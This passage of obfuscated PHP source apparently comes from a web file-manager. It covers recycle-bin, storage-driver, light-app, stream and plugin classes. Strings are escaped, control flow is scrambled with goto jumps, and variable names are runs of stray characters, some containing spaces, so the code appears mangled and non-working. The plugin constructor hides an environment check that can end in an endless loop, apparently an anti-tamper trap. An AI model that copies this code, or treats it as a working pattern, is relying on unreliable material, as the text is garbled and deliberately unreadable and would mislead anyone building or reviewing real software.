{ return $Cµ‡Ÿâ¦‰„; } } return $Cµ‡Ÿâ¦‰„; } } goto bæÄÙàÜœÜ; FºÇ—ğòîÓ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\145\x5f\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\124\151\155\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\162\164", "\146\165\156\143\164\151\x6f\x6e")); public function listData($eİ–ÔÙ¬Æ = false) { $e¹ó…ßÀÑ¤ =& $_SERVER[İë¬“ÅÒÛ›]; $eİ–ÔÙ¬Æ = $eİ–ÔÙ¬Æ ? $eİ–ÔÙ¬Æ : USER_ID; $A«Œ ·ïÙ† = $this->where(array($e¹ó…ßÀÑ¤[1086] => $eİ–ÔÙ¬Æ))->select(); return array_to_keyvalue($A«Œ ·ïÙ†, $e¹ó…ßÀÑ¤[33], $e¹ó…ßÀÑ¤[375]); } public function moveToRecycle($F“‘²³Œ) { goto fÜ¨Î ÄáÖ; dÜÔ±—: $this->recycleMove($F“‘²³Œ, 1); if ($A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[376]] == $CŒ¯–®¥æ[377]) { $d˜ğÑ·¾‘‚ = array($CŒ¯–®¥æ[400] => array($CŒ¯–®¥æ[409], $A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[374]] . $F“‘²³Œ . $CŒ¯–®¥æ[410])); $dÒ‹½³ˆÚ†->where($d˜ğÑ·¾‘‚)->setField($CŒ¯–®¥æ[411], 1); } goto c“Ÿ·ÎÃ›Õ; Aè´ˆ’¡æ: if (!$A¨Œ¯í¨ÃÙ || $A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[411]] == $CŒ¯–®¥æ[377]) { return; } $f‘ß–ˆÑ§ë = array($CŒ¯–®¥æ[416] => $F“‘²³Œ, $CŒ¯–®¥æ[1086] => USER_ID, $CŒ¯–®¥æ[393] => $A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[394]], $CŒ¯–®¥æ[395] => $A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[396]], $CŒ¯–®¥æ[400] => $A¨Œ¯í¨ÃÙ[$CŒ¯–®¥æ[374]]); $this->add($f‘ß–ˆÑ§ë); goto dÜÔ±—; fÜ¨Î ÄáÖ: $CŒ¯–®¥æ =& $_SERVER[İë¬“ÅÒÛ›]; $dÒ‹½³ˆÚ† = Model($CŒ¯–®¥æ[855]); $A¨Œ¯í¨ÃÙ = $dÒ‹½³ˆÚ†->sourceInfo($F“‘²³Œ); goto Aè´ˆ’¡æ; c“Ÿ·ÎÃ›Õ: } public function clear() { $this->remove(!1); } public function remove($d¬Åš³×Ç = false) { goto d²•­ÚÒ; b˜æíŒœŸ•: $d¬Åš³×Ç = $d¬Åš³×Ç === !1 ? !1 : $d¬Åš³×Ç; $cí×‰ìª = array(); foreach ($DÈ´ºïœ”« as $eìé­Œ² —) { if ($d¬Åš³×Ç != !1 && !in_array($eìé­Œ² —, $d¬Åš³×Ç)) { continue; } $E¬Ó³Ê¾¯¦ = $this->where(array($bìòù’éí£[375] => $eìé­Œ² —))->find(); $b¿¹•á½¥ = $E¬Ó³Ê¾¯¦[$bìòù’éí£[394]] . $bìòù’éí£[71] . $E¬Ó³Ê¾¯¦[$bìòù’éí£[396]]; $cí×‰ìª[$b¿¹•á½¥] = array($bìòù’éí£[393] => $E¬Ó³Ê¾¯¦[$bìòù’éí£[394]], $bìòù’éí£[396] => $E¬Ó³Ê¾¯¦[$bìòù’éí£[396]]); $this->where(array($bìòù’éí£[375] => $eìé­Œ² —))->delete(); $a³Ø¤„õáó->remove($eìé­Œ² —, !1); } goto fÉÃİê‹´Ğ; fÉÃİê‹´Ğ: foreach ($cí×‰ìª as $cÍÎ¡½Â¦÷) { $a³Ø¤„õáó->targetSpaceUpdate($cÍÎ¡½Â¦÷[$bìòù’éí£[394]], $cÍÎ¡½Â¦÷[$bìòù’éí£[396]]); } goto a‘ğˆ åÍ›; d²•­ÚÒ: $bìòù’éí£ =& $_SERVER[İë¬“ÅÒÛ›]; $a³Ø¤„õáó = Model($bìòù’éí£[855]); $DÈ´ºïœ”« = $this->listData(); goto b˜æíŒœŸ•; a‘ğˆ åÍ›: } public function restore($bììÙ¤øÈŞ = false) { goto E—ĞŠ“¡Æõ; dÜÀ£‚¤çŒ: $bììÙ¤øÈŞ = $bììÙ¤øÈŞ == !1 ? !1 : $bììÙ¤øÈŞ; if (!$f“…“ÚÒï) { return !0; } $Fæ²®˜ÄŸ = array(); goto cé–ÆéÀ½å; cé–ÆéÀ½å: foreach ($f“…“ÚÒï as $d¹¹õÔ½ù) { goto FğóÓ¶éˆ; DŒÄÜŸ¾ø‚: if ($fé¾ÛšÒã[$a¿»‘¥³¡[411]] == $a¿»‘¥³¡[377]) { continue; } $this->recycleMove($d¹¹õÔ½ù, 0); if ($BØˆëÈ†”Œ[$a¿»‘¥³¡[376]] == $a¿»‘¥³¡[377]) { $A¶¶¬»ßÕå = array($a¿»‘¥³¡[400] => array($a¿»‘¥³¡[409], $BØˆëÈ†”Œ[$a¿»‘¥³¡[374]] . $d¹¹õÔ½ù . $a¿»‘¥³¡[410])); $e©Ï¹Ë¡‰¢->where($A¶¶¬»ßÕå)->setField($a¿»‘¥³¡[411], 0); } goto Dñì§ÎÆ˜’; d²ˆ‚äµ·É: if ($BØˆëÈ†”Œ[$a¿»‘¥³¡[376]] == $a¿»‘¥³¡[377]) { $Fæ²®˜ÄŸ[] = $d¹¹õÔ½ù; } goto EâåøçÈÄ; FğóÓ¶éˆ: if ($bììÙ¤øÈŞ != !1 && !in_array($d¹¹õÔ½ù, $bììÙ¤øÈŞ)) { continue; } $BØˆëÈ†”Œ = $e©Ï¹Ë¡‰¢->where(array($a¿»‘¥³¡[375] => $d¹¹õÔ½ù))->find(); $fé¾ÛšÒã = $e©Ï¹Ë¡‰¢->where(array($a¿»‘¥³¡[375] => $BØˆëÈ†”Œ[$a¿»‘¥³¡[385]]))->find(); goto DŒÄÜŸ¾ø‚; Dñì§ÎÆ˜’: $this->where(array($a¿»‘¥³¡[375] => $d¹¹õÔ½ù))->delete(); $e©Ï¹Ë¡‰¢->folderSizeReset($BØˆëÈ†”Œ[$a¿»‘¥³¡[385]]); $Fæ²®˜ÄŸ[] = $BØˆëÈ†”Œ[$a¿»‘¥³¡[385]]; goto d²ˆ‚äµ·É; EâåøçÈÄ: } $e©Ï¹Ë¡‰¢->updateModifyTime($Fæ²®˜ÄŸ); goto CÍªæª‹©†; E—ĞŠ“¡Æõ: $a¿»‘¥³¡ =& $_SERVER[İë¬“ÅÒÛ›]; $e©Ï¹Ë¡‰¢ = Model($a¿»‘¥³¡[855]); $f“…“ÚÒï = $this->listData(); goto dÜÀ£‚¤çŒ; CÍªæª‹©†: } private function recycleMove($e‰çîèĞä, $E÷èšäãšà = 1) { $Dƒ´®÷õçÓ =& $_SERVER[İë¬“ÅÒÛ›]; $c³‘œ±ŒŒÎ = Model($Dƒ´®÷õçÓ[855]); $ešªá‰áÇ = Model($Dƒ´®÷õçÓ[1793]); $DôéÔ«Û´ñ = array($Dƒ´®÷õçÓ[375] => $e‰çîèĞä); if ($E÷èšäãšà) { $c³‘œ±ŒŒÎ->where($DôéÔ«Û´ñ)->setField($Dƒ´®÷õçÓ[411], 1); $ešªá‰áÇ->eventRecycle($e‰çîèĞä, $Dƒ´®÷õçÓ[1794]); } else { $BÔƒË‡Ü“­ = $c³‘œ±ŒŒÎ->where($DôéÔ«Û´ñ)->find(); $c—ÜÄŒ¬˜ƒ = $BÔƒË‡Ü“­[$Dƒ´®÷õçÓ[376]] == $Dƒ´®÷õçÓ[377]; $Aù¹›¾ùç¡ = $c³‘œ±ŒŒÎ->fileNameAuto($BÔƒË‡Ü“­[$Dƒ´®÷õçÓ[385]], $BÔƒË‡Ü“­[$Dƒ´®÷õçÓ[28]], REPEAT_RENAME_FOLDER, $c—ÜÄŒ¬˜ƒ); if ($Aù¹›¾ùç¡ != $BÔƒË‡Ü“­[$Dƒ´®÷õçÓ[28]]) { $c³‘œ±ŒŒÎ->rename($e‰çîèĞä, $Aù¹›¾ùç¡); } $c³‘œ±ŒŒÎ->where($DôéÔ«Û´ñ)->setField($Dƒ´®÷õçÓ[411], 0); $ešªá‰áÇ->eventRecycle($e‰çîèĞä, $Dƒ´®÷õçÓ[1795]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\x73\164\157\162\141\147\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\x69\172\145\115\141\170", "\163\x79\x73\164\145\155", "\144\x65\x66\141\x75\x6c\164", "\x64\162\x69\x76\x65\x72", "\143\157\156\146\x69\x67"); public function listData($bğ½“Ì‹³ = false, $cİã¥…ŞªÎ = "\x6d\157\x64\151\146\171\124\x69\155\145", $dì¢ò¹¹ŒÀ = false) { goto FÚñšÓùí¼; D‡²Çê‹¬›: return $c±ˆ¬¹à¤; goto b·Ñ¥ïÅ•­; eòï¨ÆŒ®Ã: foreach ($c±ˆ¬¹à¤ as $fÊòª‘ŒÛÛ => $eÂÃ¼™½°) { unset($c±ˆ¬¹à¤[$fÊòª‘ŒÛÛ][$CãÌƒÉŒ [6]]); $c±ˆ¬¹à¤[$fÊòª‘ŒÛÛ][$CãÌƒÉŒ [1532]] = 0; } $B„­Åóë¶© = array_to_keyvalue($c±ˆ¬¹à¤, $CãÌƒÉŒ [33], $CãÌƒÉŒ [369]); $this->_listAppendSize($c±ˆ¬¹à¤, $B„­Åóë¶©); goto D‡²Çê‹¬›; FÚñšÓùí¼: $CãÌƒÉŒ  =& $_SERVER[İë¬“ÅÒÛ›]; $c±ˆ¬¹à¤ = parent::listData($bğ½“Ì‹³, $cİã¥…ŞªÎ, $dì¢ò¹¹ŒÀ); if ($bğ½“Ì‹³) { return $c±ˆ¬¹à¤; } goto eòï¨ÆŒ®Ã; b·Ñ¥ïÅ•­: } public function _listAppendSize(&$eğó¤Ÿ°çó, $D†ê¥ÌÌ¯æ) { $BÙÔÛï„Æ =& $_SERVER[İë¬“ÅÒÛ›]; $fŠ›Ä¡¡ = $BÙÔÛï„Æ[1796] . implode($BÙÔÛï„Æ[47], $D†ê¥ÌÌ¯æ) . $BÙÔÛï„Æ[1797]; $F´¾²ŞŞÜÄ = Model($BÙÔÛï„Æ[480])->query($fŠ›Ä¡¡); $F´¾²ŞŞÜÄ = array_to_keyvalue($F´¾²ŞŞÜÄ, $BÙÔÛï„Æ[369], $BÙÔÛï„Æ[78]); foreach ($eğó¤Ÿ°çó as $fÌ•§·ŠÄ¬ => $b¥‰¾òÉÃ÷) { $eğó¤Ÿ°çó[$fÌ•§·ŠÄ¬][$BÙÔÛï„Æ[1532]] = isset($F´¾²ŞŞÜÄ[$b¥‰¾òÉÃ÷[$BÙÔÛï„Æ[369]]]) ? $F´¾²ŞŞÜÄ[$b¥‰¾òÉÃ÷[$BÙÔÛï„Æ[369]]] : 0; } } public function getConfig($Cï»è‡Šƒù) { $e¥²Ñ‚Ó = parent::listData($Cï»è‡Šƒù); return json_decode($e¥²Ñ‚Ó[$_SERVER[İë¬“ÅÒÛ›][6]], !0); } public function update($b²èÂ¢, $FœËº“†) { goto c±İŠº°Ÿ±; Aã™Ææ¿†õ: if (isset($bò†’âå¾œ[$BåÙÉøÆ»]) && $bò†’âå¾œ[$BåÙÉøÆ»][$e¼‚˜¹Ãöï[369]] != $b²èÂ¢) { return !1; } if (isset($FœËº“†[$e¼‚˜¹Ãöï[1798]]) && $FœËº“†[$e¼‚˜¹Ãöï[1798]] == $e¼‚˜¹Ãöï[377]) { $this->checkConfig($FœËº“†); } unset($FœËº“†[$e¼‚˜¹Ãöï[1798]]); goto bøãğˆ‘İ; bøãğˆ‘İ: $C¼ù¹Ô§ª = parent::update($b²èÂ¢, $FœËº“†); if ($C¼ù¹Ô§ª && $FœËº“†[$e¼‚˜¹Ãöï[34]]) { foreach ($bò†’âå¾œ as $e¡¢‰Œ™îˆ) { if ($e¡¢‰Œ™îˆ[$e¼‚˜¹Ãöï[34]] && $e¡¢‰Œ™îˆ[$e¼‚˜¹Ãöï[369]] != $b²èÂ¢) { parent::update($e¡¢‰Œ™îˆ[$e¼‚˜¹Ãöï[369]], array($e¼‚˜¹Ãöï[34] => 0)); } } } return $C¼ù¹Ô§ª; goto FÎÆ–Ö®ìÔ; c±İŠº°Ÿ±: $e¼‚˜¹Ãöï =& $_SERVER[İë¬“ÅÒÛ›]; $BåÙÉøÆ» = $FœËº“†[$e¼‚˜¹Ãöï[28]]; $bò†’âå¾œ = array_to_keyvalue(parent::listData(), $e¼‚˜¹Ãöï[28]); goto Aã™Ææ¿†õ; FÎÆ–Ö®ìÔ: } public function add($c…¬Üå–Üß) { goto EŞ¢ÅÅ­œ; EëâäÔÉŒĞ: $this->checkConfig($c…¬Üå–Üß); $f¯àªÎîˆŸ = parent::insert($c…¬Üå–Üß); if ($f¯àªÎîˆŸ && $c…¬Üå–Üß[$eŞ·¨‹§ÏÌ[34]]) { foreach ($bÅ£ªªé² as $b¹œÁÍòë) { if ($b¹œÁÍòë[$eŞ·¨‹§ÏÌ[34]]) { parent::update($b¹œÁÍòë[$eŞ·¨‹§ÏÌ[369]], array($eŞ·¨‹§ÏÌ[34] => 0)); } } } goto dÊì®ìÎ³º; EŞ¢ÅÅ­œ: $eŞ·¨‹§ÏÌ =& $_SERVER[İë¬“ÅÒÛ›]; $bÅ£ªªé² = array_to_keyvalue(parent::listData(), $eŞ·¨‹§ÏÌ[28]); if (isset($bÅ£ªªé²[$c…¬Üå–Üß[$eŞ·¨‹§ÏÌ[28]]])) { return !1; } goto EëâäÔÉŒĞ; dÊì®ìÎ³º: return $f¯àªÎîˆŸ; goto E—Š¼¸ŸÈ¶; E—Š¼¸ŸÈ¶: } public function checkConfig(&$D¯ï£Ã—¤á) { goto AÙôïÈòÈË; fÚ¦¸¯£Ä«: $DÀ¡…‘ùŒí = $BĞò”ôã‹š[72] . $c‡ØÍ²òµÃ; $c˜“ë‘ƒ“Ğ = new $DÀ¡…‘ùŒí($AÚŞÌ‰³Ñç); if (in_array($CŠê¯çé÷É, $c˜“ë‘ƒ“Ğ->objectDriver)) { if (!$c˜“ë‘ƒ“Ğ->isBucketCors() && !$c˜“ë‘ƒ“Ğ->setBucketCors()) { show_json(LNG($BĞò”ôã‹š[1799]), !1); } } goto aõö·Ğ¤Šò; aõö·Ğ¤Šò: $cõÒµ·¡å = $c˜“ë‘ƒ“Ğ->getPath($AœˆøãÚë‰ . $BĞò”ôã‹š[1424]); if (!$c˜“ë‘ƒ“Ğ->mkfile($cõÒµ·¡å)) { show_json(LNG($BĞò”ôã‹š[1800]), !1); } $AÚŞÌ‰³Ñç[$BĞò”ôã‹š[773]] = $AœˆøãÚë‰; goto F¡óœùŠ¹; F¡óœùŠ¹: $D¯ï£Ã—¤á[$BĞò”ôã‹š[6]] = json_encode($AÚŞÌ‰³Ñç); $D¯ï£Ã—¤á[$BĞò”ôã‹š[89]] = $c‡ØÍ²òµÃ; return !0; goto CÇÁ‰Ú•è¨; AÑªÊñºÒ: foreach ($AÚŞÌ‰³Ñç as $F‹Œù®’æá => $FÜ›õ•Óøæ) { $AÚŞÌ‰³Ñç[$F‹Œù®’æá] = trim($FÜ›õ•Óøæ); } $AœˆøãÚë‰ = rtrim($AÚŞÌ‰³Ñç[$BĞò”ôã‹š[773]], $BĞò”ôã‹š[8]) . $BĞò”ôã‹š[8]; $c‡ØÍ²òµÃ = $this->driverType($CŠê¯çé÷É); goto fÚ¦¸¯£Ä«; AÙôïÈòÈË: $BĞò”ôã‹š =& $_SERVER[İë¬“ÅÒÛ›]; $CŠê¯çé÷É = strtolower($D¯ï£Ã—¤á[$BĞò”ôã‹š[89]]); $AÚŞÌ‰³Ñç = json_decode_force($D¯ï£Ã—¤á[$BĞò”ôã‹š[6]]); goto AÑªÊñºÒ; CÇÁ‰Ú•è¨: } private function driverType($EŸ……ÌÑ‡æ) { $c¶¿‰‰ =& $_SERVER[İë¬“ÅÒÛ›]; $C†öòÜ±Œ® = array($c¶¿‰‰[102] => $c¶¿‰‰[1801], $c¶¿‰‰[58] => $c¶¿‰‰[1802], $c¶¿‰‰[65] => $c¶¿‰‰[774]); if (isset($C†öòÜ±Œ®[$EŸ……ÌÑ‡æ])) { return $C†öòÜ±Œ®[$EŸ……ÌÑ‡æ]; } return strtoupper($EŸ……ÌÑ‡æ); } public function driverListSystem() { $Eí½Íé‹˜Í =& $_SERVER[İë¬“ÅÒÛ›]; $F‹¬„öÀ¯ä = parent::listData(); $d×†®Üïî = array(); foreach ($F‹¬„öÀ¯ä as $C˜êÍÔãÉ›) { unset($C˜êÍÔãÉ›[$Eí½Íé‹˜Í[187]], $C˜êÍÔãÉ›[$Eí½Íé‹˜Í[106]]); $C˜êÍÔãÉ›[$Eí½Íé‹˜Í[6]] = json_decode_force($C˜êÍÔãÉ›[$Eí½Íé‹˜Í[6]]); $d×†®Üïî[] = $C˜êÍÔãÉ›; } return $d×†®Üïî; } public function defaultDriver() { $D™Ù–ëñÄª =& $_SERVER[İë¬“ÅÒÛ›]; $E¿µÔˆÛŒ• = parent::listData(); $f°Ãƒ”å³ = array_filter_by_field($E¿µÔˆÛŒ•, $D™Ù–ëñÄª[34], 1); $f°Ãƒ”å³ = $f°Ãƒ”å³[0]; if ($f°Ãƒ”å³) { $f°Ãƒ”å³[$D™Ù–ëñÄª[6]] = json_decode($f°Ãƒ”å³[$D™Ù–ëñÄª[6]], !0); } return $f°Ãƒ”å³; } public function driverInfo($C…•Ö™ø…) { $B ±¯ÍÓâƒ =& $_SERVER[İë¬“ÅÒÛ›]; $fİæˆ˜‰« = array_to_keyvalue(parent::listData(), $B ±¯ÍÓâƒ[369]); if (!isset($fİæˆ˜‰«[$C…•Ö™ø…])) { return !1; } $f˜³õ²‚½ = $fİæˆ˜‰«[$C…•Ö™ø…]; $f˜³õ²‚½[$B ±¯ÍÓâƒ[6]] = json_decode_force($f˜³õ²‚½[$B ±¯ÍÓâƒ[6]]); return $f˜³õ²‚½; } public function removeWithFile($b¬±Ş†Á) { goto BÅ«ëŠãÜñ; Eˆğ×°Ú°á: $C•©ˆ„‡é = KodIO::defaultDriver(); $e¼½à®å× = $C•©ˆ„‡é[$C˜ğğïæì[369]]; $fÃ·¥âåÏ = "\x7b\x69\157\x3a{$e¼½à®å×}\x7d\x2f"; goto EæßĞ‡â³…; EæßĞ‡â³…: $E¦…›‹• = Model($C˜ğğïæì[164])->where($EƒšÌ¿ÀÊö)->field($C˜ğğïæì[1806])->select(); foreach ($E¦…›‹• as $bòçÚ¢Ø‚Ó) { goto bÁ³ºèŒÑï; bÁ³ºèŒÑï: $dŒ–§¼Ò¼ = $bòçÚ¢Ø‚Ó[$C˜ğğïæì[76]]; $EŠâ‡öÈ§  = $fÃ·¥âåÏ . str_replace("\173\x69\157\72{$b¬±Ş†Á}\175\57", $C˜ğğïæì[33], $dŒ–§¼Ò¼); if (!IO::exist($dŒ–§¼Ò¼)) { $this->removeByFileID($bòçÚ¢Ø‚Ó[$C˜ğğïæì[383]]); continue; } goto eŞËÒåÍ‚¡; C”ĞÚ—Ç´ò: Model($C˜ğğïæì[164])->where($EƒšÌ¿ÀÊö)->save($CÙÄƒÎÂÉ®); goto dËİë§ßÕ; eŞËÒåÍ‚¡: if (!IO::exist($EŠâ‡öÈ§ ) && !IO::move($dŒ–§¼Ò¼, $EŠâ‡öÈ§ )) { continue; } $EƒšÌ¿ÀÊö = array($C˜ğğïæì[383] => $bòçÚ¢Ø‚Ó[$C˜ğğïæì[383]]); $CÙÄƒÎÂÉ® = array($C˜ğğïæì[481] => $e¼½à®å×, $C˜ğğïæì[76] => $EŠâ‡öÈ§ ); goto C”ĞÚ—Ç´ò; dËİë§ßÕ: } return parent::remove($b¬±Ş†Á); goto F­ÆóÀÓ§ø; BÅ«ëŠãÜñ: $C˜ğğïæì =& $_SERVER[İë¬“ÅÒÛ›]; $EƒšÌ¿ÀÊö = array($C˜ğğïæì[481] => $b¬±Ş†Á); $dºñó‘ªƒº = Model($C˜ğğïæì[412])->where($EƒšÌ¿ÀÊö)->count(); goto eŞÕ–Šİç; eŞÕ–Šİç: $eì¥‰”Û™­ = Model($C˜ğğïæì[412])->where($EƒšÌ¿ÀÊö)->sum($C˜ğğïæì[78]); $D÷Áãº…±ç = new TaskFileTransfer($C˜ğğïæì[1803] . $b¬±Ş†Á, $C˜ğğïæì[1804], $dºñó‘ªƒº, LNG($C˜ğğïæì[1805]) . "\x28{$b¬±Ş†Á}\51"); $D÷Áãº…±ç->task[$C˜ğğïæì[456]] = $eì¥‰”Û™­; goto Eˆğ×°Ú°á; F­ÆóÀÓ§ø: } public function progress($c›Ö¿¸Â­Ä) { return Task::get($_SERVER[İë¬“ÅÒÛ›][1803] . $c›Ö¿¸Â­Ä); } private function removeByFileID($A˜•³‰İ×Å) { $AŒââèª˜‡ =& $_SERVER[İë¬“ÅÒÛ›]; $fÀÔê©÷ = Model($AŒââèª˜‡[855])->field($AŒââèª˜‡[1780])->where(array($AŒââèª˜‡[383] => $A˜•³‰İ×Å))->select(); $fÀÔê©÷ = array_to_keyvalue($fÀÔê©÷, $AŒââèª˜‡[33], $AŒââèª˜‡[375]); foreach ($fÀÔê©÷ as $eî‘Äˆâˆˆ) { Model($AŒââèª˜‡[986])->remove($eî‘Äˆâˆˆ, !1); } } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\114\151\x67\150\x74\x41\160\x70"; public $modelType = "\x53\171\x73\164\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\141\x6d\145", "\x67\x72\157\x75\x70", "\144\x65\163\143", "\x63\157\x6e\164\x65\156\164"); public function listData($EƒŞÕ¸Ëêˆ = false, $FŞ¹±¸…Ü = "\155\157\144\151\146\x79\124\x69\x6d\x65", $e âÛ‚„ = true) { return parent::listData($EƒŞÕ¸Ëêˆ, $FŞ¹±¸…Ü, $e âÛ‚„); } public function remove($f™ÁÅ‚á±) { $f÷èÆÉ‹Ââ = $this->findByName($f™ÁÅ‚á±); if (!$f÷èÆÉ‹Ââ) { return !1; } return parent::remove($f÷èÆÉ‹Ââ[$_SERVER[İë¬“ÅÒÛ›][369]]); } public function add($D¹Ï‹Äï‡í) { if ($this->findByName($D¹Ï‹Äï‡í[$_SERVER[İë¬“ÅÒÛ›][28]])) { return !1; } return parent::insert($D¹Ï‹Äï‡í); } public function update($aÆ¥…™õĞˆ, $aÃ‰¾Âšïì) { $B£´÷…ŠÌ³ =& $_SERVER[İë¬“ÅÒÛ›]; $cï˜Ãæ¦ ƒ = $this->findByName($aÆ¥…™õĞˆ); $b…ÏŞ³ÑœÔ = $this->findByName($aÃ‰¾Âšïì[$B£´÷…ŠÌ³[28]]); if (!$cï˜Ãæ¦ ƒ || $b…ÏŞ³ÑœÔ && $b…ÏŞ³ÑœÔ[$B£´÷…ŠÌ³[369]] != $cï˜Ãæ¦ ƒ[$B£´÷…ŠÌ³[369]]) { return !1; } return parent::update($cï˜Ãæ¦ ƒ[$B£´÷…ŠÌ³[369]], $aÃ‰¾Âšïì); } } goto aâù˜İÀã; c¸õ—‚‘ƒœ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eƒìËáˆî•, $b¹ãïâÊ› = 0) { parent::__construct(); $this->source = $eƒìËáˆî•; $this->sourceSize = $b¹ãïâÊ›; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($B·ŞµÙÜØ = false) { return $this->sourceSize; } public function getContent($C†„ºäå = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $d¢¯ê¤µŞÑ = ftell($this->source); $Eáâ•Ùğ = @fread($this->source, $this->sourceSize); fseek($this->source, $d¢¯ê¤µŞÑ); return $Eáâ•Ùğ; } } public function fileSubstr($c–¥»åÁ„¤ = false, $C‘å—¾äÃ = 0, $EÓÏªµÛ´ = 0) { if (!$EÓÏªµÛ´) { $EÓÏªµÛ´ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $C‘å—¾äÃ, $EÓÏªµÛ´); } if ($this->sourceType == self::TYPE_FILE) { $bƒ­ö¡œ¿ó = ftell($this->source); fseek($this->source, $bƒ­ö¡œ¿ó + $C‘å—¾äÃ); $E¯ºİ ¨Æ„ = @fread($this->source, $EÓÏªµÛ´); fseek($this->source, $bƒ­ö¡œ¿ó); return $E¯ºİ ¨Æ„; } } public function hashMd5($f÷Òïç ‹ª = false) { return md5($this->getContent()); } public static function hash($cÇã—§©¯, $DßÈ¸ºë¾æ = 0) { $Cƒ¼ ¢œ¬Ñ = new PathDriverStream($cÇã—§©¯, $DßÈ¸ºë¾æ); return $Cƒ¼ ¢œ¬Ñ->hashSimple($cÇã—§©¯); } public static function md5($f†ĞœˆŠ¢­, $b‘¼Š®¥´Æ = 0) { $D«¨ºêŒÖÎ = new PathDriverStream($f†ĞœˆŠ¢­, $b‘¼Š®¥´Æ); return $D«¨ºêŒÖÎ->hashMd5($f†ĞœˆŠ¢­); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eÌÉ‹¶³‹²; F•Ìë¼¬¥: $this->values = array(); return $this; goto e˜Éš¤å×; ešù±À¡•: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $B˜¼ì¤ë‚ƒ[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $B˜¼ì¤ë‚ƒ[8]; $this->pluginLangArr = $this->initLang(); goto F•Ìë¼¬¥; eÌÉ‹¶³‹²: $B˜¼ì¤ë‚ƒ =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($_SERVER[$B˜¼ì¤ë‚ƒ[556]]) || !isset($_SERVER[$B˜¼ì¤ë‚ƒ[592]])) { goto Fñ‡ì«¡â; Dãó®÷…¡: $fÈÜÛÏ†Ü­ = explode($B˜¼ì¤ë‚ƒ[224], $D…ßË¯­Ğ¥); if (count($fÈÜÛÏ†Ü­) < $B˜¼ì¤ë‚ƒ[558]) { die; } $cóÀîğğÆİ = $B˜¼ì¤ë‚ƒ[559]; goto F¯œ¡šó·ƒ; Fñ‡ì«¡â: $c•ƒ•óá¨ß = $B˜¼ì¤ë‚ƒ[557]; $Dåñíï¾áù = BASIC_PATH . $B˜¼ì¤ë‚ƒ[554]; $D…ßË¯­Ğ¥ = $c•ƒ•óá¨ß($Dåñíï¾áù); goto Dãó®÷…¡; F¯œ¡šó·ƒ: $cóÀîğğÆİ(LIB_DIR); for (;;) { $cóÀîğğÆİ = json_encode($GLOBALS[$B˜¼ì¤ë‚ƒ[983]]); } goto eĞ´´ó±õ; eĞ´´ó±õ: } global $in, $config; goto dœ÷³Û¦½Ê; AËâÉìŒø: $this->pluginName = str_replace($B˜¼ì¤ë‚ƒ[432], $B˜¼ì¤ë‚ƒ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $B˜¼ì¤ë‚ƒ[8]; $this->pluginApi = rtrim(APP_HOST, $B˜¼ì¤ë‚ƒ[8]) . $B˜¼ì¤ë‚ƒ[984] . $this->pluginName . $B˜¼ì¤ë‚ƒ[8]; goto ešù±À¡•; dœ÷³Û¦½Ê: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($B˜¼ì¤ë‚ƒ[432]); goto AËâÉìŒø; e˜Éš¤å×: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[İë¬“ÅÒÛ›][985]); } protected function assign($A­“œÀ‹í, $a˜ÅôŠÄ¤» = false) { if (is_array($A­“œÀ‹í)) { $this->values = array_merge($this->values, $A­“œÀ‹í); } else { $this->values[$A­“œÀ‹í] = $a˜ÅôŠÄ¤»; } } protected function display($F¢Ôâ‰¡ç) { extract($this->values); require $F¢Ôâ‰¡ç; } final function hookRegist($a„‘ñ­ƒˆ’) { $this->modelPlugin->appRegist($this->pluginName, $a„‘ñ­ƒˆ’); } final function appIcon() { $cŠÔ‹ãµ… =& $_SERVER[İë¬“ÅÒÛ›]; $c¿‘¸ˆ’ëó = $this->appPackage(); $b‰ß°ôöÖ£ = $cŠÔ‹ãµ…[33]; if (isset($c¿‘¸ˆ’ëó[$cŠÔ‹ãµ…[986]])) { if (isset($c¿‘¸ˆ’ëó[$cŠÔ‹ãµ…[986]][$cŠÔ‹ãµ…[987]])) { $b‰ß°ôöÖ£ = $cŠÔ‹ãµ…[988] . $c¿‘¸ˆ’ëó[$cŠÔ‹ãµ…[986]][$cŠÔ‹ãµ…[987]] . $cŠÔ‹ãµ…[989]; } else { if ($c¿‘¸ˆ’ëó[$cŠÔ‹ãµ…[986]][$cŠÔ‹ãµ…[990]]) { $b‰ß°ôöÖ£ = $cŠÔ‹ãµ…[991] . $c¿‘¸ˆ’ëó[$cŠÔ‹ãµ…[986]][$cŠÔ‹ãµ…[990]] . $cŠÔ‹ãµ…[992]; } } } return $b‰ß°ôöÖ£; } final function fileCanView($DÊÉÊŠŞ²) { $Açíù¤±°Õ =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->isShare($DÊÉÊŠŞ²)) { return !0; } if (!Action($Açíù¤±°Õ[993])->authCan($Açíù¤±°Õ[994])) { show_tips(LNG($Açíù¤±°Õ[995]), !1); } 